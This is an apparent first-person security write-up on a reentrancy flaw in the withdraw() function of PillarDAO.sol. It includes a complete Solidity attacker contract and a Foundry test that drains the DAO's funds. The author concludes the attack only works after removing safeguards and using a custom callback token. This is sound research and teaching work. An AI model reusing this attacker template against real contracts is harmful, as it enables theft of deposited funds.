# Reentrancy attack in the withdraw() function of PillarDAO.sol

This is my first real world finding in smart contracts hacking.

A reentrancy attack occurs when a contract’s function makes an external call before updating its own state, allowing a malicious contract to recursively invoke that function and manipulate state or drain funds before the first invocation completes

---

**Conclusion:  We successfully showed that the reentrancy could be exploited by creating our own vector, since PillarDAO is using ERC20 token for stacking, we needed to deploy the contract with a custom token that allows Reentrancy.**

This means that our custom token allows the attack, because PillarDAO is making use of an ERC20 token it's not possible.


### 1 - Introduction

I found this vulnerability by using Slither, a static analysis tool for solidity.

![withdraw-reentrancy](https://github.com/user-attachments/assets/9ba23fb8-d1b0-49cd-8ac5-30e57b804e23)


As we can see token.safeTransfer is called before updating state variables not following CEI principles.

![withdraw-exploitation-impediment](https://github.com/user-attachments/assets/a108a01f-fddb-4ba5-8895-c8d3d42d0656)


We can see I withdrew Reentrance flag from the function to allow the exploitation. Also I removed membershipNFT.burn statement which block the reentrancy. <br><br>
The test is successfully demonstrating the reentrancy vulnerability up to the point where the MembershipNFT logic reverts (because it tries to burn an already-burned NFT on the second reentrant call).
- On the first withdraw(), the NFT is burned and state is set to zero.<br>
- On the reentrant call, the contract tries to burn the same NFT again, but it no longer exists, so OpenZeppelin's ERC721 reverts with owner query for nonexistent token.

### 2 - Understanding the requirements and Attack flow  

This reentrancy attack exploits a vulnerability in `PillarDAO.withdraw()` where state variables are updated **after** external calls, violating the Checks-Effects-Interactions (CEI) pattern. The attack allows draining the DAO's funds by repeatedly calling `withdraw()` before state updates are applied.

#### 2.1 - What do we need for the attack:<br>
A contract that can receive tokens and call back into withdraw<br>
I need to write a malicious contract that:<br>
Deposits into the DAO<br>
Waits for the staking term to pass<br>
Calls withdraw<br>
In its onERC20Received (or fallback) function, calls withdraw again (reentrancy)<br>
The attacker must be a member and have a deposit<br>
**The attacker contract must:**<br>
Have a valid membership (i.e., have deposited)<br>
Have waited the required time (stakingTerm)<br>
The DAO must use a token that allows reentrancy<br>
If the token is a standard ERC20, reentrancy is not possible via transfer!!!! ->** very important here.**<br>
But if you control the token (e.g., a custom ERC20 that calls back), you can simulate the attack.<br>
<br><br>
Since I didn't know which token standard was used (I didn't search for it too), I decided to create a malicious token that will be used by DAO that allows reentrancy !

#### 2.2 - The attack flow
The attack consists of:
- Creating a malicious token that triggers a callback during transfers
- Setting up an attacker contract that can reenter the withdraw function
- Using the test file to set up and execute the attack
- Showing how the funds are drained due to the reentrancy vulnerability

### 3 - Exploitation

#### 3.1 -  Creating a malicious token that triggers a callback.
![withdraw-eviltoken](https://github.com/user-attachments/assets/05f4a79a-c0c5-4b92-a2a1-c58f19b46e5c)

Very simple implementation, you can see that it triggers tokensReceived that I need to implement. This function will be the reentrancy attack where I will try to call multiple times withdraw() to drain all the funds from the PillarDAO contract.

![withdraw-reenter](https://github.com/user-attachments/assets/01eafbdc-c312-4c15-9223-ae3c9bacff02)

#### 3.2 - The attacker contract that can reenter the withdraw function


```solidity

contract ReentrancyAttacker {
    PillarDAO public dao;
    MembershipNFT public nft;
    ERC20PresetMinterPauser public token;
    uint256 public attackCount;
    uint256 public maxAttacks;
    address public owner;

    constructor(
        address _dao,
        address _nft,
        address _token,
        uint256 _maxAttacks
    ) {
        dao = PillarDAO(_dao);
        nft = MembershipNFT(_nft);
        token = ERC20PresetMinterPauser(_token);
        maxAttacks = _maxAttacks;
        owner = msg.sender;
    }

    /// @notice Deposit into the DAO
    /// @param amount Number of tokens to deposit
    function attackDeposit(uint256 amount) external {
        // require(msg.sender == owner, "only owner");
        token.approve(address(dao), amount);
        dao.deposit(amount);
    }

    /// @notice Start the withdraw attack
    function attackWithdraw() external {
        // require(msg.sender == owner, "only owner");
        attackCount = 0;
        dao.withdraw();
    }

    /// @notice ERC20 tokensReceived hook to re-enter withdraw
    function tokensReceived() external {
        if (attackCount < maxAttacks) {
            attackCount++;
            dao.withdraw();
        }
    }

    /// @notice Drain stolen tokens back to owner
    function drain() external {
        // require(msg.sender == owner, "only owner");
        token.transfer(owner, token.balanceOf(address(this)));
    }

    /// @notice ERC721 receiver hook (no-op)
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
```

#### 3.3 the test function

```solidity
function testWithdrawReentrancyExploit() public {
    // Deploy custom ERC20 with callback
    ERC20WithCallback evilToken = new ERC20WithCallback("EvilToken", "EVL");

    // Deploy NFT
    MembershipNFT evilNFT = new MembershipNFT("EvilMembership", "EVLM");

    // Deploy DAO with evil token
    address;
    PillarDAO evilDAO = new PillarDAO(
        address(evilToken),
        stakeAmount,
        address(evilNFT),
        preExistingMembers
    );
    evilNFT.setVaultAddress(address(evilDAO));

    // Deploy attacker contract
    uint256 maxAttacks = 3;
    ReentrancyAttacker attacker = new ReentrancyAttacker(
        address(evilDAO),
        address(evilNFT),
        address(evilToken),
        maxAttacks
    );

    // Fund attacker with tokens
    evilToken.mint(address(attacker), stakeAmount);

    // Fund DAO with extra tokens (simulate other users' deposits)
    evilToken.mint(address(evilDAO), 20000 ether); // Now DAO has 20,000 ether

    // Attacker deposits
    vm.prank(address(attacker));
    attacker.attackDeposit(stakeAmount);

    // Fast forward time
    vm.warp(block.timestamp + 52 weeks + 1);

    // Log balances before attack (in ether)
    emit log_named_uint("DAO balance before (ether)", evilToken.balanceOf(address(evilDAO)) / 1 ether);
    emit log_named_uint("Attacker balance before (ether)", evilToken.balanceOf(address(attacker)) / 1 ether);

    // Attacker starts the exploit
    vm.prank(address(attacker));
    attacker.attackWithdraw();

    // Log balances after attack (in ether)
    emit log_named_uint("DAO balance after (ether)", evilToken.balanceOf(address(evilDAO)) / 1 ether);
    emit log_named_uint("Attacker balance after (ether)", evilToken.balanceOf(address(attacker)) / 1 ether);

    // The attacker should have more than their original stake
    assertGt(evilToken.balanceOf(address(attacker)), stakeAmount);

    // Clean up: attacker sends tokens to test contract for inspection
    vm.prank(address(attacker));
    attacker.drain();
}
```
####  3.4 - Results
We can see using an amount  of 10000 eth, the attacker drained 40000 ethers on total.

![withdraw-reentrancy-exploit](https://github.com/user-attachments/assets/f693e49a-863f-482b-9b9d-59b9be3744be)

### 4 - Conclusion
We successfully showed that the reentrancy could be exploited by creating our own vector, since PillarDAO is using ERC20 token for stacking, we needed to deploy the contract with a custom token that allows Reentrancy.

This means that our custom token allows the attack, because PillarDAO is making use of an  ERC20 token it's not possible.

---

####  Bonus Why Fallback() is not possible here

In a standard reentrancy attack using fallback():
- A vulnerable contract sends ETH to an attacker contract
- The attacker contract's fallback() or receive() function is triggered
- This function then calls back into the vulnerable contract before state is updated

For ERC20 tokens:
- token.transfer() doesn't trigger fallback() functions, because it's just updating internal balances
- safeTransfer() from SafeERC20 also doesn't trigger fallback()

The key difference is that ETH transfers automatically trigger the fallback/receive function, while ERC20 transfers don't. **So by default we can say that using ERC20 implementation mitigates part of the risks for reentrancy attacks!**



